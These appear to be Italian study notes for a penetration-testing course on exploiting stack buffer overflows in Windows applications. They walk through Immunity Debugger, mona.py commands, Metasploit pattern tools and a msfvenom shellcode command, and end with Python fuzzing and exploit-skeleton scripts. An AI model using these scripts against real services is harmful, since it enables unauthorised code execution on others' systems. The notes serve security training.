Link di riferimento:

*] https://liodeus.github.io/2020/08/11/bufferOverflow.html  
*] https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst  
*] https://github.com/corelan/mona

Il test è più semplice se si riesce a ottenere una copia dell'eseguibile in esecuzione.  
Meglio se accompagnato da codice sorgente.

Primo passaggio: Avviare l'applicazione
----------------------------------------  
Avvia ImmunityDebugger in una installazione di Windows e da lì aprire ed eseguire l'applicazione da analizzare o agganciare il processo dell'applicazione da analizzare.

Secondo passaggio: Fuzzing
-----------------------------  
Si tratta di capire quanti byte sono necessari per causare il crash dell'applicazione.  
Uno strumento per creare un pattern di caratteri da inviare all'applicazione è */usr/share/metasploit-framework/tools/exploit/pattern_create.rb/pattern_create.rb*.  
La sintassi dello strumento prevede di specificare con il parametro *-l* la dimensione in byte che avrà il pattern.

Terzo passaggio: Calcolo dell'offset
----------------------------------------------------------------  
Per offset si intende la quantità di byte necessari per riempire il buffer dell'applicazione e poter successivamente sovrasscrivere una porzione dello stack di memoria.  

Per individuare l'offset usare sempre il tool */usr/share/metasploit-framework/tools/exploit/pattern_create.rb* e generare un nuovo pattern con una dimensione maggiorata di qualche byte
(Es. durante la fase di fuzzing sono stati sufficienti 100 byte per causare il crash, creare un pattern di 500).  

In ImmunityDebugger, sfruttando lo script *mona.py*, il comando *!mona findmsp -distance [BYTE_PATTERN]* permette di ricavare il valore dell'offset.  
Sempre da ImmunityDebugger, in alternativa, si ricava l'indirizzo del valore EIP e usando */usr/share/metasploit-framework/tools/exploit/pattern_create.rb/pattern_offset.rb -q [VALORE_EIP] -l [BYTE_PATTERN]* si ricava l'offset.  

E' possibile verificare che l'offset sia giusto inviando all'applicazione un numero di caratteri pari al valore stesso dell'offset (Es. "A" * offset) seguito da 4 byte di un valore a scelta (Es. "B" * 4).  
In ImmunityDebugger vedremo che l'applicazione va in crash e nel campo EIP comparirà il valore *41414141* che corrisponde a "B" * 4.  
Questa verifica suggerisce che possiamo scrivere nello stack di memoria riservato dal programma.

Terzo passaggio: Individuare i valori che causano l'interruzione del shellcode
-------------------------------------------------------------------------------
Prima di inviare il payload da eseguire, è necessario individuare quali caratteri causano una interruzione della shellcode e una chiusura anticipata del programma.
Ad esempio, se il l'applicazione è scritta in C (e varianti), il carattere *\x00* va escluso perché corrisponde al null byte, interruzione di stringa.
Quindi, al fine di trovare tutti i caratteri che possono causare problemi nell'esecuzione del nostro payload, in ImmunityDebugger, usando il comando *!mona bytearray -b [VALORI_DA_ESCLUDERE]*, si genera un array di caratteri esadecimali meno i valori/caratteri specificati.

Il bytearray generato va inviato all'applicazione come payload, dopo l'offset e dopo il valore di ritorno.
Sempre in ImmunityDebugger, dopo il crash dell'applicazione usare il comando *!mona compare -f C:\mona\[PATH]\bytearray.bin -a [ESP_ADDRESS]*.
Il confronto tra l'array generato in precedenza e il valore riportato all'indirizzo ESP, ci permette di ricavare quali ulteriori caratteri siano da escludere dal payload.
Da notare che non tutti i caratteri individuati sono da escludere. La corruzione di un carattere può comportare la corruzione del carattere successivo.
Ad esempio, la corruzione del carattere "\x05" può causare la corruzione del carattere "\x06" ma da escludere sarà solo il primo.

In caso di nuovi caratteri da escludere, si ripete la creazione del bytearray specificando tutti i caratteri da escludere.
Si reinvia all'applicazione e si ripete il confronto.

Solo quando il risultato del confronto sarà "Unmodified" e non ci saranno altri caratteri corrotti si può concludere questa fase.

Quarto passaggio: Generazione del payload e individuazione dei punti JMP
-------------------------------------------------------------------------
Il tool più immediato per la generazione della shellcode è msfvenom.  
Esempio di uso, *msfvenom -p [PAYLOAD] [PARAMETRI_PAYLOAD] -b [CARATTERI_DA_ESCLUDERE] -f [FORMATO_SHELLCODE]*  
Il risultato va inviato come parte del payload all'applicazione.

Per poter eseguire correttamente tutto il payload è necessario che al posto delle 4 "B" usate come test ci sia un indirizzo vero.  
Questo indirizzo deve corrispondere a un punto nello stack a cui il programma deve saltare per eseguire le istruzioni della shellcode, un JMP Point o Return Address).  
Il comando *!mona jmp -r esp -cpb [BAD_CHARS]* consente di individuare uno o più JMP Points.  
Tale valore, nello script va scritto secondo la convenzione Little-Endian ovvero a rovescio (Es. "A1B2C3D4" si scrive "\xD4\xC3\xB2\xA1")

Quinto passaggio: Valori NOPs
------------------------------
Il valore No Operation, abbreviato NOP e corrispondente al carattere "\x90", istruisce Windows a considerare quello spazio come vuoto e di passare oltre.  Aggiungendo un certo numero di NOPs dopo il Return Address si crea uno spazio di comodo in modo tale che non si verifichino sorprese nell'esecuzione della shellcode.  
Per la stessa ragione si aggiunge una quantità di NOPs, seppur ridotta, dopo la shellcode.

Pre = "\x90" * 32  
Post = "\x90" * 16

-------------------------------------------------------------------

Lista comandi mona.py.

CONFIGURA SPAZIO DI LAVORO  
!mona config -set workingfolder c:\mona\%p

CALCOLA OFFSET - VALORE PATTERN  
!mona findmsp -distance [LUNGHEZZA_BYTE_STRINGA]

CREAZIONE ARRAY DI VALORI (INIZIALE CON \x00)  
!mona bytearray -b [CARATTERI_DA_ESCLUDERE]

COMPARA ARRAY E VAORI RICEVUTI NEL PAYLOAD PER INDIVIDUARE ULTERIORI CARATTERI "DANNOSI" - USARE VALORE ESP  
!mona compare -f C:\mona\oscp\bytearray.bin -a [VALORE_ESP]

INDIVIDUA SALTO SPECIFICANDO I CARATTERI DA ESCLUDERE USATIANCHE SOPRA - IL VALORE VA SCRITTO NELL'EXPLOIT IN BASE ALL'ORDINE BIG O LITTLE ENDIAN  
!mona jmp -r esp -cpb [CARATTERI_DA_ESCLUDERE]

--------------------------------------------------------------------

Esempi script in python.

Fuzzing script
----------------

#!/usr/bin/env python3

import socket, time, sys

ip = [IP]

port = [PORTA]  
timeout = 5  
prefix = ""

string = prefix + "A" * 100

while True:  
  try:  
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  
      s.settimeout(timeout)  
      s.connect((ip, port))  
      s.recv(1024)  
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))  
      s.send(bytes(string, "latin-1"))  
      s.recv(1024)  
  except:  
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))  
    sys.exit(0)  
  string += 100 * "A"  
  time.sleep(1)


Exploit script
---------------
import socket

ip = [IP]  
port = [PORTA]

prefix = ""  
offset = 0  
overflow = "A" * offset  
retn = ""  
padding = ""  
payload = ""  
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:  
  s.connect((ip, port))  
  print("Sending evil buffer...")  
  s.send(bytes(buffer + "\r\n", "latin-1"))  
  print("Done!")  
except:  
  print("Could not connect.")
